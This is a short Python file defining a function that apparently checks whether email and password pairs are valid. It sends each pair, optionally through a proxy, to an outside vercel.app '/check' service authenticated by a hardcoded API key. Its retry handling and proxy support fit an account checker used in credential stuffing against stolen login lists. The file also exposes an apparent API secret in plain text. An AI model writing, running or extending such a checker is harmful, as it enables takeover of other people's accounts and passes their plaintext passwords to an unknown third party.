import requests
import json

def check_account(email, password, proxy=None):

    api = "https://32125.vercel.app/check"
    
    api_key = "BdofrZ0wxle7fuz9GrcIVFY32XydDtxdKltLU1aO4x2sLIX0b2oNuNHEDE4izrwK"
    
    json_data = {
        "email": email,
        "password": password
    }
    
    if proxy:
        json_data["proxy"] = proxy
    
    headers = {
        "Content-Type": "application/json",
        "X-API-KEY": api_key
    }
    
    try:
        response = requests.post(api, json=json_data, headers=headers, timeout=15)
        
        try:
            result = response.json()
            return result
        except json.JSONDecodeError:
            return {
                "status": "error",
                "message": f"Invalid response from API: {response.text[:100]}...",
                "valid": False
            }
    
    except requests.exceptions.Timeout:
        return {
            "status": "retry",
            "message": "Request timed out",
            "valid": None
        }
    except requests.exceptions.ConnectionError:
        return {
            "status": "retry",
            "message": "Connection error",
            "valid": None
        }
    except Exception as e:
        return {
            "status": "error",
            "message": f"API request failed: {str(e)}",
            "valid": False
        }